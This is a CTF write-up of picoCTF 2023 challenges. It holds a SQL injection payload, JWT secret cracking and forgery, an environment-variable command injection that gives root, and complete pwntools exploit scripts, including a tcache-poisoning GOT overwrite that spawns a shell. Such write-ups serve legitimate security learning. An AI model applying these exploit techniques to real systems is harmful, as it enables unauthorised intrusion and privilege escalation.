Here guys are my writeup for challenges solved during the latest picoCTF 2023


#General Skills

() Chrono

![image](https://user-images.githubusercontent.com/64267672/228117698-4184bd30-b03b-4b50-8ba3-941a0417a0f5.png)

() Permissions

![image](https://user-images.githubusercontent.com/64267672/228118455-d825d58f-77b5-44a2-b1c9-fb523ba4b3be.png)


() repetitions

Decoding the base64 encoded text 6 times gets us the decoded flag to submit

![image](https://user-images.githubusercontent.com/64267672/228119610-b6bd99b8-1361-41be-9cab-b8938deaed22.png)


() Rules 2023

Reading the rules of engagement of the competition, i can see the flag within (a simple search can get you it too)

![image](https://user-images.githubusercontent.com/64267672/228120017-d8ebf8bc-65fb-4950-b629-ae0a739dfe3f.png)

() useless

Reading the man page of the script in the user home directory & we can find the flag as part of the author description 

![image](https://user-images.githubusercontent.com/64267672/228121066-b056c8e3-3b26-43a4-a43b-2b5df0321a6e.png)

() Special

![image](https://user-images.githubusercontent.com/64267672/228122187-355f00b0-0016-4678-89a5-4c7e24e97839.png)



#Reverse Engineering 

() Timer

![image](https://user-images.githubusercontent.com/64267672/228123398-f73e19e4-6b32-41d0-a669-cce6bca8749a.png)


![image](https://user-images.githubusercontent.com/64267672/228123612-1cf581ad-555d-4f20-975e-df99b99591d6.png)


![image](https://user-images.githubusercontent.com/64267672/228123684-ef094590-f5b6-41c7-abe1-5e5c3fbed751.png)


() Ready Gladiator 1 

The Challenge;

![image](https://user-images.githubusercontent.com/64267672/228849001-3199851f-91a0-4ae2-a474-a3c1643cbf53.png)


The solution;

After so much CoreWars research i found a public exploit code that worked & printed the flag for me.


![image](https://user-images.githubusercontent.com/64267672/228849898-19b14346-40f4-4dfc-84bf-829db5f79098.png)


() Ready Gladiator 2

The Challenge;

![image](https://user-images.githubusercontent.com/64267672/228851670-3bd4b76b-c9fc-4675-8700-da785431974a.png)


The solution;

I solved this challenge with the same payload but as the hint says, i kept repeating it(11x) subsequently until i eventually got the flag

![image](https://user-images.githubusercontent.com/64267672/228852166-11178b0d-cdde-4ad8-b9ff-e3de8ca34b95.png)


#Web Exploitation 

() findme

The Challenge 

![image](https://user-images.githubusercontent.com/64267672/228128270-94e9e251-bbd5-41a2-8adf-bedddc4d8d2d.png)


The solution;

Capturing all the web traffic with burp & we can observe the redirections has different encoded string parameter value & we can decode them to get the flag

![image](https://user-images.githubusercontent.com/64267672/228128506-223710d2-a18a-4014-a045-ff3c03f0d33b.png)

![image](https://user-images.githubusercontent.com/64267672/228128556-024e85dc-f728-46b2-9c11-f57a5bf3d935.png)


![image](https://user-images.githubusercontent.com/64267672/228128723-b37a4830-9bd5-4e33-91ff-0443b89c0726.png)



() MatchTheRegex

The challenge;

![image](https://user-images.githubusercontent.com/64267672/228129970-62b5c6c4-99a6-4407-99da-74ca385e5939.png)

The solution;

The wrong regex gives an error like below 

![image](https://user-images.githubusercontent.com/64267672/228130075-45c30d28-8312-4de4-ab1d-7d0a66efe208.png)

The right regex prints the flag

![image](https://user-images.githubusercontent.com/64267672/228130216-c3306337-ccc0-4622-8212-7aeb9e2139a4.png)



() Soap

The challenge;

![image](https://user-images.githubusercontent.com/64267672/228134601-f05d3cbf-e01e-4510-a667-c8438d9c9bb2.png)


The solution;

![image](https://user-images.githubusercontent.com/64267672/228134888-c2812480-3465-4484-8eb6-060b573b3c38.png)


![image](https://user-images.githubusercontent.com/64267672/228134955-4d0dc30f-be76-47b8-89a1-91682ed0ad5f.png)


() More SQLi

The challenge;

![image](https://user-images.githubusercontent.com/64267672/228135941-761eea36-11e1-4277-a51a-9a6dcd4ba4f6.png)


The solution;

' or 1=1 --

![image](https://user-images.githubusercontent.com/64267672/228136569-8061ce3e-55b0-4295-9cbb-7f4ac7acd423.png)

![image](https://user-images.githubusercontent.com/64267672/228136639-7c5d1d0e-1a91-4d9a-90e9-5aa1d5e0b83f.png)


() Java Code Analysis!?!

The challenge;

![image](https://user-images.githubusercontent.com/64267672/228137255-21974037-edbf-486c-8dae-b2a37b596add.png)


The solution;

This is the UI after login in

![image](https://user-images.githubusercontent.com/64267672/228137458-cba78b53-9019-40e0-8140-3199cc984e44.png)

The request captured with burp to get the jwt token while login in;

![image](https://user-images.githubusercontent.com/64267672/228142596-a3cb6e76-2617-4c74-85bb-532d26c0ed4f.png)


We can crack the jwt token with hashcat to get the secret key;

![image](https://user-images.githubusercontent.com/64267672/228142319-c9d8a353-175a-4cc4-b62e-245e40e63474.png)




We can modify the jwt token with the secret key to verify & use in the Authorization: Bearer cookie to access the book/flag 

BEFORE modification;


![image](https://user-images.githubusercontent.com/64267672/228137730-ea5a8ce5-f975-4a67-8668-7907b1966998.png)



AFTER modification;

![image](https://user-images.githubusercontent.com/64267672/228143275-6c1d0db3-c6c1-4328-8d25-6c5827a6b0c5.png)



We can see the different id numbers to access whatever book we need,here we need the id 5 which reads the flag/book for us


![image](https://user-images.githubusercontent.com/64267672/228143341-cb6a5592-78f7-42f5-850c-fe2025816721.png)


![image](https://user-images.githubusercontent.com/64267672/228144039-43d1b97f-7539-4157-80fc-c9995ee1317b.png)



#Binary Exploitation

<h3> TwoSum </h3>
![image](https://user-images.githubusercontent.com/113513376/228693406-b11eb83e-0421-4224-a4fa-a0ea99145dc0.png)

The source code for the binary is given
![image](https://user-images.githubusercontent.com/113513376/229053947-1f70120e-4c86-4a09-bf89-0bf5367ee950.png)

Here's what this code does

```
This C program prompts the user to enter two positive integers, adds them together, and checks for integer overflow. 
If an integer overflow is detected, the program prints a message and exits.
If no overflow is detected, the program prints a message and exits.
```

The vulnerability thats present here is integer overflow 

Here's the resource on it [acunetix](https://www.acunetix.com/blog/web-security-zone/what-is-integer-overflow/)

So if we give it `2147483647` and `1` it will cause an integer overflow which will then make the program give the flag

Trying it remotely works
![image](https://user-images.githubusercontent.com/113513376/229057520-be08bf7b-b4ea-4aae-b688-6422697e3601.png)

<h3> BabyGame02 </h3>
![image](https://user-images.githubusercontent.com/113513376/228694432-30c4f2af-6d09-4f81-8e83-9066b495d5ef.png)

After downloading the binary the next thing i check was its file type and protections enabled on the binary
![image](https://user-images.githubusercontent.com/113513376/229067106-366bce12-2757-4f35-bea2-7ddcc4753115.png)

So we're working with a x86 binary and the only protections enabled is just No Execute (NX)

Using ghidra i'll decompile the binary
![image](https://user-images.githubusercontent.com/113513376/228695541-5d0cdbd0-3878-44c4-aecb-1301f1162d90.png)

This is still the same binary as game01 but the only difference here is that after the user wins the game the win function isn't called

```
  do {
    do {
      iVar1 = getchar();
      local_11 = (char)iVar1;
      move_player(&local_aa8,(int)local_11,local_a9d);
      print_map(local_a9d,&local_aa8);
    } while (local_aa8 != 0x1d);
  } while (local_aa4 != 0x59);
  puts("You win!");
  return 0;
}
```

After i took my time checking out what happens when the program runs and whats happening in the memory i found that at the calling of solve round+47 the value of the stack register esp will be the return address (address $eip is pointing to)
![image](https://user-images.githubusercontent.com/113513376/229068045-387a0e32-f423-4d90-8710-cf841b49f837.png)
![image](https://user-images.githubusercontent.com/113513376/229068120-295c19e9-8261-4794-b24d-16c718173528.png)

```
$eip   : 0x080495b6  →  <solve_round+47> add esp, 0x10
```

It's means that the eip is pointing to the solve_round function. 

Now here's what happen when the player moves around the game and we check the stack memory addresses

I'll set a breakpoint at address move_player+212
![image](https://user-images.githubusercontent.com/113513376/229068370-15a5413e-1cd8-4ecd-bfa8-733314ab574e.png)
![image](https://user-images.githubusercontent.com/113513376/229068404-d2f2a69c-3e72-4ebf-9543-72e81fab478c.png)
![image](https://user-images.githubusercontent.com/113513376/229068556-5fe0d7ee-a559-4966-8dc5-2ba0f3511de3.png)
![image](https://user-images.githubusercontent.com/113513376/229068600-c1ce7688-89d3-4fe8-81bb-3b75f357300d.png)

So the player character @ is moving around the stack as we move around the game map

If we go out of bound in the game the program will crash because the $eip will try accessing an invalid address 

Another thing we should take note of is that when we move round the memory it's pointers on the stack is being modified

And since the eip is going to be pointing to solve_round whenever we use `p`, and also the solve_round uses the move_player function 

So the eip will point to the esp

The idea now is that can we modify something useful to control the $eip so that we can get it to give us the flag

There's a function given by the game we can allow us change character

So since the player character is moving round the stack, so its overwriting some values on the stack 

But the problem is we can just overwrite the @ structure which only just overwrites the last value of an address of the stack

Now this is more of like a ret2win binary exploitation lets find a way to take control of the execution of the program

Since we can only overwrite the last byte so we need a similar address to the win() function we can overwrite

So after setting a breakpoint at *solve_round+47
![image](https://user-images.githubusercontent.com/113513376/229068891-7e8ed91f-0ea1-4ef3-8066-741069deb30e.png)
![image](https://user-images.githubusercontent.com/113513376/229068962-9ba93ad1-ddcb-4dfb-8dcf-e3940ca37ad1.png)

Then on checking the stack, i got an address of the stack that looks very similar to the win() function
![image](https://user-images.githubusercontent.com/113513376/229069706-25648ae3-a4e5-45c0-a386-ed2ccae16bc0.png)
We can see the similarity between the stack address 0x08049709 and the win function address 0x0804975d

Only one byte difference that makes it not the same as the win function address

Now next thing is that since while we move round the map and out of bound, the player character is also moving round the stack therefore overwriting bytes on the stack which makes the program crashes, the idea i think is that there's a particular memory on the stack can be overwritten to the win function address.

And for this to occur the character needed to overwrite it is ] which will later turn to 5d in hex

And we know that the l function changes the player character to anything specified. So that means we can change our player character to ]

So basically we can control where this ] ends up as this 0x5d which is now the player so we can try and find the position on the map that is 89 bytes offset from that address that is close to the win function which is the stack address we got earlier

Using a script i made to move round the map and get the offset

```
#!/usr/bin/env python3

from pwn import *

context.log_level = 'warning'

for offset in range(40, 50):
    game = process('./game')

    game.sendline(b'l]')
    game.sendline(b'w'*4)
    game.sendline(b'd'*offset)
    game.sendline(b'wp')

    output = game.recvall()
    if b'testing' in output:
        print(f" offset: {offset}")
        break

    game.close()
```

I already have file flag.txt whose content is `testing{fake_flag}`

Running the script gives the offset to get to the win function
![image](https://user-images.githubusercontent.com/113513376/229070331-576cd3f8-5e92-43e1-96a9-8b63e2d8e0ad.png)

Now i can get the flag by running 

```
python2 -c "print 'l]' + 'wwww' + 'd'*47 + 'wp'"  | ./game
```

Trying that gets me the flag
![image](https://user-images.githubusercontent.com/113513376/229069995-416453a9-a863-4446-a36c-edace6d9d8d9.png)

But using remotely doesn't work
![image](https://user-images.githubusercontent.com/113513376/229070520-29780a36-a979-455d-8594-67b2776e4f09.png)

After asking in discord people says the binary on the remote is different from the one given (at least its offset)

That made me then make a brute force script on the offset 

```
#!/usr/bin/env python3

from pwn import *
import string
import warnings

context.log_level = 'warning'
warnings.filterwarnings('ignore')

for i in string.printable:
    #io = remote('saturn.picoctf.net', 52597)
    io = process('./game')
    io.sendline('l' + i)
    io.sendline(b'w' * 4)
    io.sendline(b'd' * 47)
    io.sendline(b'wp')

    output = io.recvall()
    if b'picoCTF' in output:
        print(f"offset found {i}")
        flag = output.decode('utf-8')
        list = flag.split()
        print(list[-1])
        break
```

Running it gives the flag
![image](https://user-images.githubusercontent.com/113513376/229084331-0ed82734-7732-4455-b0f1-3e3ea2e3291b.png)


<h3> VNE </h3>
![image](https://user-images.githubusercontent.com/113513376/228703179-7349a3e6-6c9a-48e8-b2a5-c6ec27cec495.png)

After connecting to the ssh instance it shows this binary file
![image](https://user-images.githubusercontent.com/113513376/229088006-25f77194-f7d7-4b2c-9a9c-6fd7a2ff5f7a.png)

Running it asks to set the SECRET_DIR environment variable
![image](https://user-images.githubusercontent.com/113513376/229088835-33c6ebfc-9dee-4f6a-b7b2-81f3f7b81f12.png)

So i set it to /root
![image](https://user-images.githubusercontent.com/113513376/229088304-d12ef8cc-4672-4203-b1b9-1c2598d80c01.png)
And after running it, it shows the list of files in root directory

So its likely doing ls then getenv(SECRET_DIR) 

I searched for command injection in environment variable and got [Resource](https://int0x33.medium.com/day-29-set-user-id-environment-variable-injection-path-user-for-linux-priv-esc-ea6c0adc19b8)

Trying it works and we get shell as root
![image](https://user-images.githubusercontent.com/113513376/229088997-659875b6-3c93-4b9f-b747-d92f2e41ede4.png)

<h3> HorseTrack </h3>
![image](https://user-images.githubusercontent.com/113513376/228821375-eda5f850-5ea6-4a90-86dd-426bc072e4f4.png)

After downloading the binary i ran it to get an idea of what it does
![image](https://user-images.githubusercontent.com/113513376/229089970-60011c18-994a-4269-9401-3e8d75e9a773.png)

From the challenge description we can tell its a heap sort of challenge and its likely UAF since i noticed most pwn heap chall pico ctf brings are based on UAF

After playing with the binary and understanding it, I concluded that for us to exploit this binary we're going to advantage of tcache poisoning with a UAF vulnerability

Here's my exploit mechanism

```
1. add_horse() .. allocates buffer
2. remove_horse() .. frees buffer
3. move_horse() ...
4. And finally tcache poisoning attack to have malloc() return an arbritary pointer to a target memory location. Overwritting the free GOT entry with system with a horse named /bin/sh
```

Here's my solve script

```
#!/usr/bin/env python3

from pwn import *

LOCAL = True  # Set to False to connect to the remote server

if LOCAL:
    r = process('./vuln')
else:
    r = remote('saturn.picoctf.net', 63578)

def edit_horse(idx, data, spot):
    r.sendlineafter(b'Choice: ', b'0')
    r.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
    r.sendlineafter(b'Enter a string of 16 characters: ', data)
    r.sendlineafter(b'New spot? ', str(spot).encode())

def add_horse(idx, size, data):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
    r.sendlineafter(b'Horse name length (16-256)? ', str(size).encode())
    r.sendlineafter(b'characters: ', data)

def free_horse(idx):
    r.sendlineafter(b'Choice: ', b'2')
    r.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())

def race_horse():
    r.sendlineafter(b'Choice: ', b'3')

def exploit():
    # leak heap
    add_horse(0, 0x10, b'A' * 0x10)
    free_horse(0)
    add_horse(0, 0x10, b'\xFF')
    # fill system GOT
    for i in range(1, 5):
        add_horse(i, 0x10, b'X' * 0x10)
    race_horse()
    r.recvuntil(b' ')
    heap_base = u32(r.recvn(10).strip().ljust(4, b'\x00')) << 12
    log.info('heap_base: %#x', heap_base)
    r.recvuntil(b'WINNER:')
    # tcache list
    add_horse(10, 0x18, b'A' * 0x18)
    add_horse(11, 0x18, b'B' * 0x18)
    free_horse(10)
    free_horse(11)
    # change tcache bins to free GOT
    free_got = 0x404010
    edit_horse(11, p64(free_got ^ (heap_base >> 12)) + p64(heap_base + 0x10), 1)
    add_horse(12, 0x18, b'/bin/sh\0' + b'C' * 0x10)
    # change free GOT to system
    ret_gadget = 0x401E48
    system_plt = 0x401090
    payload = flat(
        p64(0),
        p64(system_plt),
        p64(ret_gadget),
    )
    add_horse(13, 0x18, payload)
    free_horse(12)
    r.sendline(b'cat flag.txt')
    r.interactive()

if __name__ == '__main__':
    exploit()

```

Runnig it locally works
![image](https://user-images.githubusercontent.com/113513376/229090221-a34ca54b-880a-4468-85fa-525c55dc2460.png)

Running it remotely works also (set LOCAL=False in script)
![image](https://user-images.githubusercontent.com/113513376/229091308-e940ba8a-e3eb-405d-8368-cbbe342c0468.png)




